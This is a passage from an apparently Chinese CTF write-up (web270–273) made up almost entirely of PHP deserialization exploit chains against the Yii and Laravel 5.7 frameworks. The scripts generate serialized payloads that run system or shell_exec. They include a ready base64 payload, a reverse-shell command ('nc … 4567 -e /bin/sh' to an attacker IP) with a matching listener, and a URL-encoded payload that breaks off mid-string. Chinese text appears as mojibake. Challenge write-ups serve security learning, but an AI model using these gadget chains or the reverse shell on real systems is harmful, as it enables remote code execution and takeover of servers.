invoke__">serialize</span>(<span class="variable">$exp</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?r=backdoor/shell&amp;code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNzoieWlpXHdlYlxEYlNlc3Npb24iOjE6e3M6MTM6IndyaXRlQ2FsbGJhY2siO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czoxMDoic2hlbGxfZXhlYyI7czoyOiJpZCI7czoxMjoiY3AgL2YqIDEudHh0Ijt9aToxO3M6MzoicnVuIjt9fX0=</span><br></pre></td></tr></table></figure><h1 id="web270"><a href="#web270" class="headerlink" title="web270"></a>web270</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Action</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">IndexAction</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="variable">$func</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="variable">$param</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">web</span> &#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">MultiFieldSession</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">writeCallback</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DbSession</span> <span class="keyword">extends</span> <span class="title">MultiFieldSession</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;writeCallback = [<span class="keyword">new</span> \yii\rest\<span class="title function_ invoke__">IndexAction</span>(<span class="variable">$func</span>, <span class="variable">$param</span>), <span class="string">&quot;run&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span> &#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">base</span>\<span class="title class_">BaseObject</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> \yii\web\<span class="title function_ invoke__">DbSession</span>(<span class="variable">$func</span>, <span class="variable">$param</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">exp</span> = <span class="title class_">new</span> \<span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>(&#x27;<span class="title class_">shell_exec</span>&#x27;, &#x27;<span class="title class_">nc</span> <span class="title class_">xxx</span>.<span class="title class_">xxx</span>.<span class="title class_">xxx</span>.<span class="title class_">xxx</span> 4567 -<span class="title class_">e</span> /<span class="title class_">bin</span>/<span class="title class_">sh</span>&#x27;);</span><br><span class="line">    <span class="keyword">echo</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$exp</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åå¼¹ä¸€ä¸‹å³å¯ï¼Œæ”»å‡»æœºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp ç«¯å£å·</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690628634956-c431daf0-409d-44ba-b40f-75d327b056de.png" alt="image.png"></p><h1 id="web271"><a href="#web271" class="headerlink" title="web271"></a>web271</h1><blockquote><p><a href="https://github.com/laravel/laravel/tree/5.7">https://github.com/laravel/laravel/tree/5.7</a> laravel5.7</p></blockquote><h3 id="laravel5-7ååºåˆ—åŒ–æ¼æ´"><a href="#laravel5-7ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="laravel5.7ååºåˆ—åŒ–æ¼æ´"></a>laravel5.7ååºåˆ—åŒ–æ¼æ´</h3><p>pocï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Testing</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">PendingCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">test</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$app</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$command</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$parameters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$test</span>, <span class="variable">$app</span>, <span class="variable">$command</span>, <span class="variable">$parameters</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;test = <span class="variable">$test</span>;                 <span class="comment">//ä¸€ä¸ªå®ä¾‹åŒ–çš„ç±» Illuminate\Auth\GenericUser</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;app = <span class="variable">$app</span>;                   <span class="comment">//ä¸€ä¸ªå®ä¾‹åŒ–çš„ç±» Illuminate\Foundation\Application</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;command = <span class="variable">$command</span>;           <span class="comment">//è¦æ‰§è¡Œçš„phpå‡½æ•° system</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;parameters = <span class="variable">$parameters</span>;     <span class="comment">//è¦æ‰§è¡Œçš„phpå‡½æ•°çš„å‚æ•°  array(&#x27;id&#x27;)</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">DefaultGenerator</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">default</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$default</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="keyword">default</span> = <span class="variable">$default</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Application</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">instances</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$instances</span> = []</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;instances[<span class="string">&#x27;Illuminate\Contracts\Console\Kernel&#x27;</span>] = <span class="variable">$instances</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">defaultgenerator</span> = <span class="title class_">new</span> <span class="title class_">Faker</span>\<span class="title class_">DefaultGenerator</span>(<span class="title class_">array</span>(&quot;<span class="title class_">hello</span>&quot; =&gt; &quot;<span class="title class_">world</span>&quot;));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$app</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Foundation\Application</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$application</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Foundation\Application</span>(<span class="variable">$app</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pendingcommand</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Foundation\Testing\PendingCommand</span>(<span class="variable">$defaultgenerator</span>, <span class="variable">$application</span>, <span class="string">&#x27;system&#x27;</span>, <span class="keyword">array</span>(<span class="string">&#x27;cat /flag&#x27;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$pendingcommand</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>post dataä¸­ä¼ å…¥å‚æ•°å³å¯</p><h1 id="web272ã€web273"><a href="#web272ã€web273" class="headerlink" title="web272ã€web273"></a>web272ã€web273</h1><p>pocï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Author:monitor</span></span><br><span class="line"><span class="comment">description:</span></span><br><span class="line"><span class="comment">    laravel deserialization chain</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">PendingBroadcast</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$events</span>,<span class="variable">$event</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;events = <span class="variable">$events</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;event = <span class="variable">$event</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Bus</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Dispatcher</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">queueResolver</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$queueResolver</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;queueResolver = <span class="variable">$queueResolver</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Mockery</span>\<span class="title class_">Loader</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">EvalLoader</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">namespace</span> <span class="title class_">Mockery</span>\<span class="title class_">Generator</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">MockDefinition</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">config</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$config</span>,<span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;config = <span class="variable">$config</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;code = <span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MockConfiguration</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Queue</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">CallQueuedClosure</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">connection</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$connection</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;connection = <span class="variable">$connection</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span></span><br><span class="line">&#123;   </span><br><span class="line">    <span class="title class_">if</span>($<span class="title class_">argc</span>&lt;2)&#123;</span><br><span class="line">        <span class="title class_">echo</span> &quot;<span class="title class_">Description</span>:\<span class="title class_">n</span>\<span class="title class_">tUse</span> <span class="title class_">laravel</span> <span class="title class_">deserialization</span> <span class="title class_">to</span> <span class="title class_">eval</span> <span class="title class_">php</span> <span class="title class_">code</span>,<span class="title class_">don</span>&#x27;<span class="title class_">t</span> <span class="title class_">need</span> <span class="title class_">to</span> <span class="title class_">input</span> <span class="title class_">php</span> <span class="title class_">tags</span>.&quot;;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;\nUsage:&quot;</span> .<span class="variable">$argv</span>[<span class="number">0</span>] . <span class="string">&quot; &lt;code&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$argv</span>[<span class="number">1</span>];</span><br><span class="line">    <span class="variable">$mockconfiguration</span> = <span class="keyword">new</span> <span class="title class_">Mockery\Generator\MockConfiguration</span>(<span class="string">&quot;pass&quot;</span>);</span><br><span class="line">    <span class="variable">$mockdefination</span> = <span class="keyword">new</span> <span class="title class_">Mockery\Generator\MockDefinition</span>(<span class="variable">$mockconfiguration</span>,<span class="string">&quot;&lt;?php &quot;</span>.<span class="variable">$code</span>.<span class="string">&quot; exit;?&gt;&quot;</span>);</span><br><span class="line">    <span class="variable">$callqueuedclosure</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Queue\CallQueuedClosure</span>(<span class="variable">$mockdefination</span>);</span><br><span class="line">    <span class="variable">$evaload</span> = <span class="keyword">new</span> <span class="title class_">Mockery\Loader\EvalLoader</span>();</span><br><span class="line">    <span class="variable">$dispatcher</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Bus\Dispatcher</span>(<span class="keyword">array</span>(<span class="variable">$evaload</span>,<span class="string">&quot;load&quot;</span>));</span><br><span class="line">    <span class="variable">$pendingbroadcast</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Broadcasting\PendingBroadcast</span>(<span class="variable">$dispatcher</span>,<span class="variable">$callqueuedclosure</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$pendingbroadcast</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æˆ–è€…ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Bus</span>\<span class="title class_">Dispatcher</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Console</span>\<span class="title">QueuedCommand</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PendingBroadcast</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;events=<span class="keyword">new</span> <span class="title class_">Dispatcher</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;event=<span class="keyword">new</span> <span class="title class_">QueuedCommand</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Console</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Mockery</span>\<span class="title class_">Generator</span>\<span class="title class_">MockDefinition</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">QueuedCommand</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$connection</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;connection=<span class="keyword">new</span> <span class="title class_">MockDefinition</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Bus</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Mockery</span>\<span class="title class_">Loader</span>\<span class="title class_">EvalLoader</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Dispatcher</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$queueResolver</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;queueResolver=[<span class="keyword">new</span> <span class="title class_">EvalLoader</span>(),<span class="string">&#x27;load&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Mockery</span>\<span class="title class_">Loader</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">EvalLoader</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">namespace</span> <span class="title class_">Mockery</span>\<span class="title class_">Generator</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">MockDefinition</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">config</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;code=<span class="string">&quot;&lt;?php system(&#x27;cat /f*&#x27;);exit()?&gt;&quot;</span>; <span class="comment">//æ­¤å¤„æ˜¯PHPä»£ç </span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;config=<span class="keyword">new</span> <span class="title class_">MockConfiguration</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MockConfiguration</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$name</span>=<span class="string">&quot;feng&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span>\<span class="title class_">PendingBroadcast</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">PendingBroadcast</span>()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=O%<span class="number">3</span>A40%<span class="number">3</span>A%<span class="number">22</span>Illuminate%<span class="number">5</span>CBroadcasting%<span class="number">5</span>CPendingBroadcast%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>events%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A25%<span class="number">3</span>A%<span class="number">22</span>Illuminate%<span class="number">5</span>CBus%<span class="number">5</span>CDispatcher%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A16%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>queueResolver%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>BO%<span class="number">3</span>A25%<span class="number">3</span>A%<span class="number">22</span>Mockery%<span 